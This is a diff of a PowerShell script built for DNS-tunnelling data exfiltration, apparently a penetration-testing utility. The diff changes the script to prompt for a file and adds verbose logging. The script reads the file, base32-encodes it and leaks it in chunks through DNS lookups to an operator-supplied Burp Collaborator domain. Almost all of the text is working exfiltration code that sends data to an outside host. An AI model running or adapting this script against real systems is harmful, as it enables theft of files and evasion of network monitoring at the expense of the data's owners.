@@ -1,5 +1,5 @@
-param([String]$exfilFile)
-
+[CmdletBinding()]
+param()
 $characterSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
 $dnsFlag="nspi";
 $amountFlag="amount";
@@ -23,11 +23,9 @@ Function Encode-Base32($data) {
 
 #Read in the collaborator address and the data to exfil
 $collabDomain = Read-Host -Prompt 'Burp Collaborator address'
-if (-not $exfilFile) {
-  $exfilData = Read-Host -Prompt 'Data to exfiltrate'
-} else {
-  $exfilData = Get-Content $exfilFile | Out-String
-}
+$exfilFile = Read-Host -Prompt 'File to exfiltrate'
+$exfilData = Get-Content $exfilFile | Out-String
+
 #Convert data to base32
 $exfilData = Encode-Base32 $exfilData
 
@@ -37,9 +35,13 @@ $counter=0
 
 #Perform the DNS query for each 63 character chunk
 foreach($word in $splitData) {
-    [Net.DNS]::GetHostEntry("$dnsFlag.$word.$counter.$collabDomain") | Out-Null
+    $chunk = "$dnsFlag.$word.$counter.$collabDomain"
+    Write-Verbose "Tunneling chunk $counter : $chunk"
+    [Net.DNS]::GetHostEntry($chunk) | Out-Null
     $counter++
 }
 
 #Tell the tunnel how much data it should expect
-[Net.DNS]::GetHostEntry("$dnsFlag.$amountFlag.$counter.$collabDomain") | Out-Null
+$amountChunk = "$dnsFlag.$amountFlag.$counter.$collabDomain"
+Write-Verbose "Tunneling amount chunk $amountChunk"
+[Net.DNS]::GetHostEntry($amountChunk) | Out-Null
